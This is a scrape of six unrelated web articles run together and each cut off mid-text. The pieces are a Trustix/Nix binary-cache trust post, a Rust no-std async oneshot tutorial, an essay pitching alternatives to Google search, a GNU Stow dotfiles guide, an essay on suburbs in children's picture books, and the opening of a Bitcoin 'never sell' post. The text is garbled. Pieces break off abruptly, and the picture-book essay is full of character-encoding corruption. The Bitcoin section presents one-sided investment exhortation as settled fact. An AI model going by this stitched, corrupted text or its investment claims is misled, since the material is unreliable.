The list of signing keys can be found in <code>/etc/nix/nix.conf</code>.
The default base64-encoded ed25519 public key with a name as additional metadata looks like this:</p>
<div data-language="text"><pre><code>trusted-public-keys = cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY=</code></pre></div>
<p>Now, in Nix, software is addressed by the hash of all of its build inputs (sources, dependencies and build instructions).
This hash, or the output path is used to query a cache (like <a href="https://cache.nixos.org/">https://cache.nixos.org</a>) for a binary.</p>
<p>Here is an example:
The hash of the <code>hello</code> derivation can be obtained from a shell with <code>nix-instantiate</code>:</p>
<div data-language="text"><pre><code>$ nix-instantiate '&lt;nixpkgs&gt;' --eval -A hello.outPath
"/nix/store/w9yy7v61ipb5rx6i35zq1mvc2iqfmps1-hello-2.10"</code></pre></div>
<p>Here, behind the scenes, we have evaluated and hashed all build inputs that the <code>hello</code> derivation needs (<code>.outPath</code> is just a helper).
This hash can then be used to query the default Nix binary cache:</p>
<div data-language="text"><pre><code>$ curl https://cache.nixos.org/w9yy7v61ipb5rx6i35zq1mvc2iqfmps1.narinfo
StorePath: /nix/store/w9yy7v61ipb5rx6i35zq1mvc2iqfmps1-hello-2.10

<p>Besides links to the archive that contains the compressed binaries, this response includes two relevant pieces of information which are used to verify binaries from the binary cache(s):</p>
<ul>
<li>The <code>NarHash</code> is a hash over all Nix store directory contents</li>
<li>The <code>Sig</code> is a cryptographic signature over the <code>NarHash</code></li>
</ul>
<p>With this information, the client can check that this binary really comes from the provider’s Nix store.</p>
<h2>What are the limitations of this model?</h2>
<p>While this model has served Nix and others well for many years it suffers from a few problems.
All of these problems can be traced back to a <a href="https://en.wikipedia.org/wiki/Single_point_of_failure">single point of failure</a> in the <a href="https://en.wikipedia.org/wiki/Chain_of_trust">chain of trust</a>:</p>
<ul>
<li>First, if the key used by cache.nixos.org is ever compromised, all builds that were ever added to the cache can be considered tainted.</li>
<li>Second, one needs to put either full trust or no trust at all in the build machines of a binary cache — there is no middle ground.</li>
<li>Finally, there is no inherent guarantee that the build inputs described in the Nix expressions were actually used to build what’s in the cache.</li>
</ul>
<h2>Trustix</h2>
<p>Trustix aims to solve these problems by assembling a mapping from build inputs to (hashes of) build outputs provided by many build machines.</p>
<p>Instead of relying on verifying packages signatures, like the traditional Nix model does, Trustix only exposes packages that it considers trustworthy.
Concretely, Trustix is configured as a proxy for a binary cache, and hides the packages which are not trustworthy.
As far as Nix is concerned, the package not being trustworthy is exactly as if the package wasn’t stored in the binary cache to begin with.
If such a package is required, Nix will therefore build it from source.</p>
<p>Trustix doesn’t define what a trustworthy package is.
What your Trustix considers trustworthy is up to you.
The rules for accepting packages are entirely configurable.
In fact, in the current prototype, there isn’t a default rule for packages to count as trustworthy: you need to configure trustworthiness yourself.</p>
<p>With this in mind, let’s revisit the above issues</p>
<ul>
<li>
<p>In Trustix, if an entity is compromised, you can rely on all
other entities in the network to establish that a binary artefact is
trustworthy. Maybe a few hashes are wrong in the Trustix mapping,
but if an overwhelming majority of the outputs are the same, you can
trust that the corresponding artefact is indeed what you would have
built yourself.</p>
<p>Therefore you never need to invalidate an entire binary cache: you
can still verify the trustworthiness of old packages, even if newer
packages are built by a malicious actor.</p>
</li>
<li>
<p>In Trustix, you never typically consider any build machine to be
fully trusted. You always check their results against the other
build machines. You can further configure this by considering some
machines as more trusted (maybe because it is a community-operated
machine, and you trust said community) or less trusted (for instance,
because it has been compromised in the past, and you fear it may be
compromised again).</p>
<p>Moreover, in the spirit of having no single point of failure,
Trustix’s mapping is not kept in a central database. Instead every
builder keeps a log of its builds; these logs are aggregated on your
machine by your instance of the Trustix daemon. Therefore even the
mapping itself doesn’t have to be fully trusted.</p>
</li>
<li>In Trustix, package validity is not ensured by a signature scheme.
Instead Trustix relies on the consistency of the input to output
mapping. As a consequence, the validity criterion, contrary to a
signature scheme, links the output to the input. It makes it
infeasible to pass the build result of input <code>I</code> as a build result for
input <code>J</code>: it would require corrupting the entire network.</li>
</ul>
<h2>Limitations: reproducibility tracking and non-reproducible builds</h2>
<p>A system like Trustix will not work well with builds that are non-reproducible, which is a limitation of this model.
After all, you cannot reach consensus if everyone’s opinions differ.</p>
<p>However, Trustix can still be useful, even for non-reproducible builds!
By accumulating all the data in the various logs and aggregating them, we can track which derivations are non-reproducible over all of Nixpkgs, in a way that is easier than previously possible.
Whereas the <a href="https://r13y.com/">r13y project</a> builds a single closure
on a single machine, Trustix will index <em>everything ever built</em> on every
architecture.</p>
<h2>Conclusion</h2>
<p>I am very excited to be working on the next generation of tooling for trust and reproducibility, and for the purely functional software packaging model pioneered by Nix to keep enabling new use cases.
I hope that this work can be a foundation for many other applications other than improving trust — for example, by enabling the Nix community to support new CPU architectures with community binary caches.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Concurrency isn't easy and implementing its primitives is even harder. I found myself in need of
some no-std, no-alloc Rust async concurrency primitives and decided to write some. I kept the
scope small so even you and I can understand it. Even so, it still involved futures, wakers,
atomics, drop and unsafe. I'll introduce each of those to you while building a simple primitive.
At the end, even you will be able to implement your own primitives!</p><div><p>First, our primitive:</p><pre><code>//! A oneshot channel is a synchronization primitive used to send a single
//! message from one task to another. When the sender has sent a message and it
//! is ready to be received, the oneshot notifies the receiver. The receiver is
//! a Rust async `Future` that can be `await`ed. Our implementation does not
//! depend on std or alloc.
//!
//! See https://tweedegolf.nl/blog/50/build-your-own-async-primitive 
//! for a full description of the internals.</code></pre><p>What do we mean by all that? First, not depending on std or alloc means we can't use many
common libraries. Rust async is still a new area and the libraries so far depend on
allocating memory at least. That makes their primitives easier to build but also unusable on
embedded devices which can't afford an allocator. I work with such devices regularly and so I've
learned to avoid allocation whenever possible. We'll see that we can write our oneshot without
allocation just fine.</p><p>Next, we don't want to block the entire CPU while waiting for the message to be sent. For one
thing, it won't be sent if the CPU is blocked. When an operating system is available, it can
schedule the sending task while the receiving task is blocked and there's no problem. Small
embedded devices usually can't afford an operating system though, so you're left with
implementing task switching manually. That can involve a lot of moving state from your only call
stack into a struct and back so you can use the call stack to continue another task.</p><p>Rust async can do it for you: First, you choose an async executor to run your tasks. These
executors can be much simpler than even an embedded OS. Then you write your tasks as normal.
When you reach a point where you need to wait for another task to finish something, you just
write <code>.await</code>. The executor will store the state of your call stack and continue with a task
that isn't blocked. When the thing you were waiting for is done, the executor will wake your
task up again.</p><p>Let's begin with a <code>Oneshot</code> struct which will contain the data both the sender and receiver
need to access in order to transfer the message. It needs to be created high on the call stack
so it will outlive all tasks that might reference it. Then we create a <code>Sender</code> and <code>Receiver</code>
struct which contain a reference to the <code>Oneshot</code>. We can then give the sender to one task and
the receiver to another. Since they both have a reference to the <code>Oneshot</code>, they must be shared
references, which means we can't safely modify just anything inside. Instead, we need to use
types which are safe to modify through shared references.</p><h3 id="the-message">The message</h3><p>First, we need a way to transfer the message from the sender to the receiver. We could move it
directly if we wait for both the sender and receiver to be ready for the transfer: We'd know
where the data is on the sender side and where it should go on the receiver side. We call this
synchronous communication, both the sender and the receiver need to be ready before the
communication happens. It has its uses, but in this case, we don't want the sender to wait for
the receiver since it won't get a response back anyway. Instead, we'll store the message in the
<code>Oneshot</code> where it can wait for the receiver to be ready.</p><p>We don't want to restrict our oneshot to just one kind of message, so we'll generalize it over
the type of the message. We'll call that type <code>T</code>. When we create a new <code>Oneshot</code> we won't have
a message for it yet so we need to tell Rust we'll initialize it later. In Rust, you'd usually
use an <code>Option&lt;T&gt;</code> but we're going to track whether we have a <code>T</code> in a separate field so we'll
use a <code>MaybeUninit&lt;T&gt;</code> instead. Finally, we need to modify the field through a shared reference.</p><p>We'll store an <code>UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;</code> which allows us to modify the message through a
shared reference as long as we do so in a block of code marked as <code>unsafe</code>. An <code>unsafe</code> block
just means we make it our own responsibility to check the code is safe instead of the
compiler's. We need to do this whenever the safety logic is too complicated for the compiler to
understand.</p><h3 id="the-synchronization">The synchronization</h3><p>Next, we need to remember whether the message is ready to be received, or in other words,
whether the <code>message</code> field has been initialized. This is not as easy as it seems. Both
compilers and processors will reorder memory accesses in order to make your code run faster.
They'll make sure the code in a single task seems like it ran in the right order, but they won't
give the same guarantee for code running in different tasks. For example, if we had used an
<code>Option&lt;T&gt;</code> to store the message, the sender might turn it into a <code>Some()</code> first and store the
message afterwards. If the receiver happened to check in between, it would try to read a message
before there was ever stored one and it would end up with a bunch of garbage.</p><p>In order to make concurrent memory accesses safe, atomics were invented. We'll remember if we
have a message with an <code>AtomicBool</code>. Atomics make sure no task sees a partial update of the
atomic. The atomic either updates completely or not at all. On top of that, it also helps us
synchronize access to other memory: The value of the <code>AtomicBool</code> determines whether we allow
the sender or the receiver to access the message. That way, they never access it at the same
time.</p><p>Finally, we want to use Rust async/await to wait until the message is ready. This requires us to
store a waker. To be able to update the waker from a shared reference, we use the very nice
<code>AtomicWaker</code> from the <code>futures</code> library.</p><pre><code>use core::cell::UnsafeCell;
use core::mem::MaybeUninit;
use core::sync::atomic::{AtomicBool, Ordering};
use futures::task::AtomicWaker;

/// Transfer a single message between tasks using async/await.
pub struct Oneshot&lt;T&gt; {
    message: UnsafeCell&lt;MaybeUninit&lt;T&gt;&gt;,
    waker: AtomicWaker,
    has_message: AtomicBool,
}</code></pre><p>The <code>Sender</code> and <code>Receiver</code> are just thin wrappers around <code>Oneshot</code> references. They are generic
over both the type of the underlying message (<code>T</code>) and the lifetime of the reference (<code>'a</code>).
Wrapping the references in a struct allows us to name them and dictate what operations they
support.</p><pre><code>pub struct Sender&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);
pub struct Receiver&lt;'a, T&gt;(&amp;'a Oneshot&lt;T&gt;);</code></pre><p>It may seem like we're not going very fast but choosing the right data representation is often
the hardest part of programming. From a good data representation, the implementation will follow
naturally. We begin with the <code>new</code> function which allows the creation of a new <code>Oneshot</code>. We
have no message yet so we don't initialize it and set <code>has_message</code> to false.</p><pre><code>impl&lt;T&gt; Oneshot&lt;T&gt; {
    pub const fn new() -&gt; Self {
        Self {
            message: UnsafeCell::new(MaybeUninit::uninit()),
            waker: AtomicWaker::new(),
            has_message: AtomicBool::new(false),
        }
    }</code></pre><h3 id="the-unsafe">The unsafe</h3><p>Next, we implement the most basic operations, putting a message in and taking it out again.
We'll get to synchronization later, so these will be unsafe functions. For performance
reasons, users may want to use these functions directly so we'll make them public. This is
fine as long as we document what properties must hold to use the function safely.</p><p>The <code>put</code> function will store a message. Since we're implementing a oneshot, we only expect
one communication so we assume there was no message before <code>put</code> gets called. This is a
property a user of this unsafe function must be told about!</p><p>As soon as we set <code>has_message</code> to true, the receiver may try to read the message so we must
make sure to write the message first. We also need to prevent the write of the message and
of <code>has_message</code> from being reordered. We do that by storing <code>has_message</code> with
<code>Ordering::Release</code>. This is a signal to the compiler that it must make sure any memory
accesses before it must be finished and visible to other cores.</p><p>Finally, we use the waker in order to schedule the receiving task to continue.</p><pre><code>    /// NOTE(unsafe): This function must not be used when the oneshot might
    /// contain a message or a `Sender` exists referencing this oneshot. This
    /// means it can't be used concurrently with itself or the latter to run
    /// will violate that constraint.
    pub unsafe fn put(&amp;self, message: T) {
        self.message.get().write(MaybeUninit::new(message));
        self.has_message.store(true, Ordering::Release);
        self.waker.wake();
    }</code></pre><p>The <code>take</code> function will check if a message is available yet and take it out of the oneshot
if it is. This time, we use <code>Ordering::Acquire</code> in order to ensure all memory accesses after
loading <code>has_message</code> really happen <strong>after</strong> it. For every synchronization between tasks, a
<code>Release</code>-<code>Acquire</code> pair is needed. Sometimes synchronization needs to go both ways and
<code>Ordering::AcqRel</code> can be used to get both effects.</p><p>When we're done taking the message, we <code>Release</code> its memory again by setting <code>has_message</code>
to <code>false</code>. If two instances of <code>take</code> run concurrently, they might both reach the message
read before setting <code>has_message</code> to <code>false</code> and thus duplicate the message so we need to
disallow that in the safety contract.</p><p>On the other hand, if it is run concurrently with <code>put</code>, according to the contract of <code>put</code>,
there must be no message beforehand. If <code>take</code> loads <code>has_message</code> first, it finds no
message and returns. If <code>put</code> writes <code>has_message</code> first, there is guaranteed to be a
message ready so <code>take</code> takes it without issue. Therefor, a single <code>take</code> can be safely run
concurrently with a single <code>put</code>. This is exactly what we need for a oneshot channel. We
never expect either function to run more than once but a single message can be transferred
between tasks …</p></div></div>

This effect is happening again. Early adopters aren’t using Google anymore.</p> <p>They aren’t using DuckDuckGo either. They’re still using Google.com, but differently. To make Google usable, users are adding faux-query modifiers that to supress the “garbage Internet”.</p> <p>You see this in the typeahead logs.</p> <p><img src="https://dcgross.com/assets/new-google/image6.png" alt=""> <em></em></p><center><em>Products (Reddit)</em></center> <p><img src="https://dcgross.com/assets/new-google/image4.png" alt=""> <em></em></p><center><em>Services (Reddit, Yelp)</em></center> <p><img src="https://dcgross.com/assets/new-google/image1.png" alt=""> <em></em></p><center><em>Movies (Rotten Tomatoes)</em></center> <p><img src="https://dcgross.com/assets/new-google/image5.png" alt=""> <em></em></p><center><em>Even code (Github)</em></center> <p>Interestingly, this doesn’t work for all categories. <img src="https://dcgross.com/assets/new-google/image3.png" alt=""> <img src="https://dcgross.com/assets/new-google/image2.png" alt=""> <em></em></p><center><em>Recipes don’t have a “Reddit” equivalent</em></center> <h3 id="query-operators-mean-somethings-broken">Query Operators Mean Something’s Broken</h3> <p>More advanced users use modifiers like <code>site: filetype: intitle:</code> because adding “reddit” isn’t strict enough, as spammy websites often manipulate content to win SEO.</p> <p>How about those websites that stuff the year in the title? “Reviews UPDATED JANUARY 2020” are exploiting the fact that customers suffix queries with the year. What those people are trying to command is freshness, not a title match.</p> <p>Something’s broken, and a tiny share of Google is open for the taking. Obviously attacking incumbents head-on doesn’t work. Here are two alternative ideas for bootstrapping next-generation search:</p> <h3 id="1-boogle-a-query-reformulator">#1 Boogle, A Query Reformulator</h3> <p>Introducing Boogle, a proxy for Google that’s just Better Google Search. It’s a query expander. We predict the correct operators for your query, proxy Google’s results, and serve. For example:</p> <p><code>query("stripe.js example") -&gt; query("stripe.js example (site:github.com OR site:gitlab.com OR site:..."))</code></p> <p><code>query("is anker charger") -&gt; query("is anker charger (inurl:forum OR site:reddit.com OR ...))"</code></p> <p>Query topic modeling is a rich science with plenty of examples.</p> <p>You’d almost as fast as Google, never worse, and occasionally better. This will help build the reflex to use you instead. This approach isn’t that hard to get started with, and might work for the high-end users.</p>  <p>You could go after this vertical by vertical – build the <em>best</em> site for electric product search, for travel, for code, etc. A key question is how to build habitual recall to use your product over Google. Amazon and Airbnb both enjoy a huge amount of direct traffic. Some learnings from those:</p> <ul> <li><strong>Stellar mobile destination.</strong> Using Airbnb directly feels more fluid and fun than using Google for Airbnb.</li> <li><strong>The 90% Rule.</strong> To build reflex you need to give me what I want most of the time.** **With Prime, Amazon made it such that we stopped price comparing across other sites; Amazon would get it to us fastest, and that turns out to matter more than price. Most of the time you open Amazon.app, it satisfies.</li> <li><strong>Come for search, stay for something else.</strong> I don’t think of Airbnb or Amazon as search apps. They help me get things or book homes. You might want to your search app to be a destination for something else. This is where I think community comes in.</li> </ul> <p>Picking a vertical that <em>doesn’t</em> have strong typeahead completions[1] would help you build community around your search engine. Recipes, fitness, fashion, etc. don’t have decacorn conglomerates like Github or Reddit. That might mean it’s easier to build community around them, and put your flagship search engine on top.</p> <hr> <p>If you’re working on this kind of stuff, try out <a href="https://pioneer.app/">Pioneer</a> or just shoot me an email – daniel@pioneer.app.</p> <hr> <p>[1] In reality I’d pick the vertical _I _love most. If you’re a guitar player start with music; a movie buff should build better Rotten Tomatos. Etc.</p> </article></div>]]>

<p>I accidentally stumbled upon something yesterday that I felt like
sharing, which fell squarely into the "why the hell didn’t I know about this
before?" category. In this post, I’ll describe how to manage
the various configuration files in your GNU/Linux home directory (aka
"dotfiles" like <code>.bashrc</code>) using GNU Stow.</p>

<p>The difficulty is that it would be helpful to manage one’s
configuration files with a version control system like Git, Mercurial
or Bazaar, but many/most dotfiles reside at the top-level of your home
directory, where it wouldn’t be a good idea to initialize a VCS
repository. Over time I’ve come across various programs which aim to
manage this for you by keeping all the files in a subdirectory and
then installing or linking them into their appropriate places. None of
those programs ever really appealed to me.  They would require a ton
of dependencies (like Ruby and a ton of libraries for it) or they
would require me to remember how to use them, which is difficult when
really for such a task you rarely use the program.</p>

<p>Lately I’ve been using <a href="http://www.gnu.org/software/stow">GNU Stow</a> to manage
programs I install from source to <code>/usr/local/</code>. Basically, in this typical
usage, you install locally built packages to
<code>/usr/local/stow/${PKGNAME}-{PKGVERSION}</code> and then from <code>/usr/local/stow/</code> you run
<code># stow ${PKGNAME}-${PKGVERSION}</code> and the program generates symbolic links to
all the programs' files into the appropriate places under <code>/usr/local/</code>. Then,
when you uninstall a program via Stow, you don’t have to worry about any stray
files that you or a provide Makefile may have missed. It also makes handling
alternate versions of a program quite easy (i.e. when I’m experimenting with
different configurations of <a href="http://dwm.suckless.org/">dwm</a> or
<a href="http://st.suckless.org/">st</a>).</p>

<p>Some time ago I happened across a mailing list posting where someone described
using Stow to manage the installation of their dotfiles. I didn’t pay much
attention to it but my brain must have filed it away for later. Yesterday I
decided to give it a try and I have to say that it is so much more convenient
than those other dedicated dotfile-management programs, even if it wasn’t an
immediately obvious option.</p>

<p>The procedure is simple. I created the <code>${HOME}/dotfiles</code> directory and then
inside it I made subdirectories for all the programs whose cofigurations I
wanted to manage. Inside each of those directories, I moved in all the
appropriate files, maintaining the directory structure of my home directory. So,
if a file normally resides at the top level of your home directory, it would go
into the top level of the program’s subdirectory. If a file normally goes in the
default <code>${XDG_CONFIG_HOME}/${PKGNAME}</code> location (<code>${HOME}/.config/${PKGNAME}</code>),
then it would instead go in <code>${HOME}/dotfiles/${PKGNAME}/.config/${PKGNAME}</code> and
so on. Finally, from the <code>dotfiles</code> directory, you just run <code>$ stow $PKGNAME</code>
and Stow will symlink all the package’s configuration files to the appropriate
locations. It’s then easy to make the <code>dotfiles</code> a VCS repository so you can
keep track of changes you make (plus it makes it so much easier to share
configurations between different computers, which was my main reason to do it).</p>

<p>For example, let’s say you want to manage the configuration for Bash, VIM and
Uzbl. Bash has a couple files in the top-level directory; VIM typically has your
.vimrc file on the top-level and a .vim directory; and Uzbl has files in
<code>${XDG_CONFIG_HOME}/uzbl</code> and <code>${XDG_DATA_HOME}/uzbl</code>. So, your home directory
looks like this:</p>

<pre><code>home/
    brandon/
        .config/
            uzbl/
                [...some files]
        .local/
            share/
                uzbl/
                    [...some files]
        .vim/
            [...some files]
        .bashrc
        .bash_profile
        .bash_logout
        .vimrc
</code></pre>

<p>You would then create a <code>dotfiles</code> subdirectory and move all the files there:</p>

<pre><code>home/
    /brandon/
        .config/
        .local/
            .share/
        dotfiles/
            bash/
                .bashrc
                .bash_profile
                .bash_logout
            uzbl/
                .config/
                    uzbl/
                        [...some files]
                .local/
                    share/
                        uzbl/
                            [...some files]
            vim/
                .vim/
                    [...some files]
                .vimrc
</code></pre>

<p>Then, perform the following commands:</p>

<pre><code>$ cd ~/dotfiles
$ stow bash
$ stow uzbl
$ stow vim
</code></pre>

<p>And, voila, all your config files (well, symbolic links to them) are
all in the correct place, however disorganized that might be, while
the actual files are all neatly organized in your <code>dotfiles</code>
directory, which is easily turned into a VCS repo. One handy thing is
that if you use multiple computers, which may not have the same
software installed on them, you can pick and choose which
configurations to install when you need them. All of your dotfiles are
always available in your <code>dotfiles</code> directory, but if you don’t need
the configuration for one program, you simply don’t Stow it and thus
it does not clutter your home directory.</p>

<p>Well, that’s all there is to it. Hopefully someone else out there
finds this useful! I know I’ve found it to be a huge help.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Once upon a time,</strong> there were four little rabbits, and their names were Flopsy, Mopsy, Cottontail and Peter. They lived with their mother in a sandbank underneath the root of a very big fir tree. One day, their mother dropped them off at soccer practice and picked them up promptly afterward. When they got home, they all had bread and milk and blackberries.</p>
<p>That is roughly how the classic Beatrix Potter story from 1902 would go if it had been set in the American suburbs. But even if Potter hadnâ€™t set her books in Englandâ€™s Lake District, she would never have chosen a suburban setting. The suburbs kill the narrative adventure that is the lifeblood of childrenâ€™s literature.</p>
<p>Reading picture books to my children over the past 10 years, Iâ€™ve noticed how many of the stories shun a suburban setting. This is no accident: the tales that most grip the imagination of children (and adults), with few exceptions, require rural or urban locations for their drama and vitality.</p>
<p>To simplify, the antithesis of North American suburbia is walkability, and picture books with literary merit love walkability. Compelling childrenâ€™s stories require that their characters are able to navigate their setting at a pedestrian scale and pace. For example, in the US author Arnold Lobelâ€™s classic stories of the 1970s, Frog and Toad never appear in a car, despite being thoroughly anthropomorphised. What most draws the reader into the stories are the adventures that the amphibians experience between their houses â€“ in the meadow, the woods and the tall grass. They climb mountains and swim in ponds, but they also walk everywhere: to fly a kite, to buy ice-cream, to fulfil a to-do list.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1372/insert-Frog-and-Toad.jpg" alt="" title=""><figcaption>From <i>Adventures of Frog and Toad</i> by Arnold Lobel. <i>Image Â© the Estate of Arnold Lobel/Amazon</i></figcaption></figure></div><div>
<p>The plots of the Frances stories of the 1960s and â€™70s written by Russell Hoban and illustrated by Lillian Hoban also revolve around walkability. Frances can walk to the general store and buy a tea set or a Chompo bar. Her trips on foot to her friendsâ€™ houses frequently initiate narrative adventure. â€˜Today is my wandering day,â€™ announces Francesâ€™s friend Albert, on which he likes to catch snakes, walk on fences and look for crow feathers. â€˜Wandering daysâ€™ in American suburbs, however, are infrequent or nearly impossible. Walkable environments preserve independence for the young, who are often the main characters in childrenâ€™s stories.</p>
<p>Both commutes are integral to the storiesâ€™ plots, enabling shenanigans for the zoo animals</p>
<p>Consider George and Martha as yet another example. The only cars we see them in are the bumper cars at the amusement park. The US writer and illustrator James Marshallâ€™s beloved hippopotamuses of the 1970s and â€™80s consistently engage meaningful, walkable destinations rather than sprawling subdivisions. They can hopscotch home after a visit to the store, comfort each other on their walk home from a scary movie, or push a bed to a picnic using roller skates.</p>
<p>In urban settings, walkability is closely <a href="https://transitcenter.org/wp-content/uploads/2016/07/Whos-On-Board-2016-7_12_2016.pdf" rel="nofollow noreferrer noopener">linked</a> to public transport, which is another narrative avenue for rich engagement with oneâ€™s environment. Accordingly, the number of picture books that feature trains and buses is significantly greater than the number of trains and buses that most Americans experience. Yet Iâ€™ve never seen a picture book that features a minivan or an SUV.</p>
<p>The zookeeper in Peggy Rathmannâ€™s <em>Good Night, Gorilla</em> (1994) lives within walking distance of the zoo. In Erin and Philip Steadâ€™s <em>A Sick Day for Amos McGee</em> (2011), the zookeeper takes the bus to work. Both commutes are integral to the storiesâ€™ plots, enabling shenanigans for the zoo animals.</p>
<p>Besides public transport, urban settings give other ample opportunities for their characters to explore their immediate environment. Cities are where weâ€™re more likely to find civic places, such as zoos, libraries or concert venues. Cities tend to have more diverse kinds of people and more intergenerational <a href="https://www.gu.org/resources/all-in-together-creating-places-where-young-and-old-thrive/" rel="nofollow noreferrer noopener">activity</a> in both public and private places than in suburbia. Good picture books such as <em>Benâ€™s Trumpet</em> (1979) by Rachel Isadora and <em>A Chair for My Mother</em> (1982) by Vera Williams exploit these opportunities in their stories.</p>
<p>Itâ€™s one thing to find enviable walkability in Esphyr Slobodkinaâ€™s <em>Caps for Sale</em> (1940) or Margaret and <span>H A Reyâ€™s</span> <em>Curious</em> <em>George</em> series (1941-66) or Ludwig Bemelmansâ€™s <em>Madeline</em> series (1939-61) â€“ books written by European Ã©migrÃ©s to the US well before American housing developments and â€˜big boxâ€™ stores became the dominant <a href="https://aeon.co/essays/step-by-step-americans-are-sacrificing-the-right-to-walk" rel="noopener">pattern</a> of land use in the mid-20th century. But to continue to find dynamic city living in bestsellers such as Bernard Waberâ€™s <em>The House on East 88th Street</em> (1962) or Mo Willemsâ€™s <em>Knuffle</em> <em>Bunny</em> (2004) is revealing. (That both stories feature beautiful Victorian brownstones as their backdrop is a bonus.) Celebrated American childrenâ€™s books authors such as William Steig, the creator of Shrek, and Tomie dePaola consistently chose pre-modern settings for their stories, so the suburbs hardly even had a fighting chance.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1373/knufflebunny1.jpg" alt="" title=""><figcaption>From <i>Knuffle Bunny</i> (2004) by Mo Willems. <i>Courtesy Walker Books</i></figcaption></figure></div><div>
<p>More than any other works of fiction, picture books depend on their setting. When the automobile dominates the setting, the narrative dies faster than a trip down a cul-de-sac. Even when there are private modes of transportation in childrenâ€™s literature, they are ships, bicycles or hot-air balloons, where the transported are engaged with the world around them and the adventure or mystery that this world brings.</p>
<p>What we donâ€™t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision to a Wal-Mart</p>
<p><strong>Of course, childrenâ€™s books</strong> are not marked exclusively by the narrative. The illustrations arguably play an even more important role. And there are multiple reasons, aside from the fact that the stories lack suburban settings, to avoid illustrations of the suburbs. One is that contemporary suburbs are often ugly. Another is that sprawl is hard to fit into a page. So, naturally, we donâ€™t find good childrenâ€™s books that feature pictures of â€˜snout housesâ€™ (with a garage that protrudes in front of the house, and typical of suburbs in the US and Canada), strip malls or parking lots. Instead, we find beautiful illustrations of the countryside and forest, such as in Jane Yolenâ€™s <em>Owl Moon</em> (1987) about a girl and her father who set out in the snow to look for an owl, or of the vibrant cityscape, as in Mordicai Gersteinâ€™s <em>The Man Who Walked Between the Towers</em> (2003) about Phillippe Petitâ€™s high-wire stunt in Manhattan, or the Paris of the <em>Madeline</em> stories.</p>
<p>Sometimes, the pictures display such stunningly beautiful and rich environments â€“ such as in <em>The Mysteries of Harris Burdick</em> (1984) by Chris Van Allsburg, or <em>Sidewalk Flowers</em> (2015) by JonArno Lawson and Sydney Smith â€“ that they carry the story with few or no words at all.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1376/insert-sidewalk-flowers.jpg" alt="" title=""><figcaption>From <i>Sidewalk Flowers</i> (2015) by JonArno Lawson and Sydney Smith. <i>Courtesy Walker Books</i></figcaption></figure></div><div>
<p>In a number of cases, the setting for a childrenâ€™s picture book isnâ€™t relevant to the argument Iâ€™m making here because the setting has nothing do with the built environment or the natural environment. In some picture books (for example, Drew Daywaltâ€™s <em>The Day the Crayons Quit</em> (2013), illustrated by Oliver Jeffers) thereâ€™s really no setting to speak of. In other cases, the setting is entirely indoors or entirely fantastical. Itâ€™s not enough that a story takes place exclusively within a single-family home for it to count as suburban. Margaret Wise Brown and Clement Hurdâ€™s <em>Goodnight Moon</em> (1947) could well be suburban, but it also could be rural. What we donâ€™t find in <em>Goodnight Moon</em> is the old lady driving her Chevy Suburban out of her subdivision of single-family homes to a Wal-Mart for some sleeping pills.</p>
<p>Itâ€™s true that some popular picture books do seem to have a suburban setting: Victoria Kannâ€™s <em>Pinkalicious</em> series (2006-), the <em>Berenstain Bears</em> series (1962-) by the Berenstain family, and Norman Bridwellâ€™s <em>Clifford the Big Red Dog</em> (1963-) come to mind. But these books also come to mind when I consider books Iâ€™d rather burn than read â€“ not because they take place in the suburbs but because theyâ€™re so poorly written and illustrated. My only claim here is that <em>the best</em> childrenâ€™s books forgo suburbia.</p>
<p>There are, nevertheless, some exceptions to this rule. In Judith Viorst and Ray Cruzâ€™s classic 1972 picture book, for example, Alexander appears to be chauffeured around the suburbs by his mother; in that scenario, who wouldnâ€™t be having a terrible, horrible, no good, very bad day? But for every quality picture book that has a suburban setting, there are 100 that donâ€™t.</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1375/inset-Town-Mouse-Country-Mouse-T9MMF4.jpg" alt="" title=""><figcaption>Illustration for Aesopâ€™s fable <i>The Town Mouse and the Country Mouse</i>. <i>Photo by Alamy</i></figcaption></figure></div><div>
<p>At least since Aesopâ€™s fable <em>The Town Mouse and the Country Mouse</em>, many childrenâ€™s stories exhibit a kind of anti-urban romanticism, of which Virginia Lee Burtonâ€™s <em>The Little House</em> (1942) is one memorable example. Cities are dangerous and dirty places in contrast to the idyllic countryside. Books set in cities often react against this trend by showing the benefits of city life. Yet this counter-reaction is, arguably, guilty of romanticising the urban. Childrenâ€™s books that use pedestrian settings, whether urban or rural, fall prey to both kinds of romanticisation, displaying exclusively the attractiveness of a walkable town or a tranquil forest. However, the accuracy of these portrayals is not the point of the settings. Rather, their job is to serve the narrative and delight the reader.</p>
<p>Childrenâ€™s literature thrives on imaginative or surprising encounters, which need a geography that creates mischief and curiosity. But the suburbs, for all their benefits in real life, are places that in childrenâ€™s literature lack imagination, or at least donâ€™t provide suitable stage-sets for imaginative adventure and exploration: …</p></div></div></div>

<p>Not Being Bullish Enough on Bitcoin is a big mistake. Why? You’ll sell too early, and not grasp Bitcoin well enough to get the big picture here. You might not secure the coins well enough, and you might not actually realise the societal implications of Bitcoin. </p>



<h2>Not Being Bullish Enough On Bitcoin Means Selling too early</h2>



<p>Fundamentally, a lot of people did not truly peer into <a href="http://stephanlivera.com/185">what Bitcoin is</a>, and this made them not bullish enough. This is a big error, as it pushes them to sell bitcoin too early. While they think they’re being clever timing a top, Bitcoin proceeds to humble them a few years later after another cycle. </p>



<p>Lopp has a great example here: </p>



<figure></figure>



<p>At time of writing in Dec 2020, Bitcoin is now around $23,000 USD. Selling early is penny wise, pound foolish. </p>



<p>Many people wish they had bought bitcoin earlier, but truth be told: that’s only half the challenge. The other half is actually HODLing it through the long term and not selling it out. </p>



<p>As bitcoin old-timers in the space will tell you, you could have bought early… but then you probably would have also sold early. It takes understanding and conviction.</p>



<h2>Not Being Bullish Enough On Bitcoin Means Not Securing it Correctly</h2>



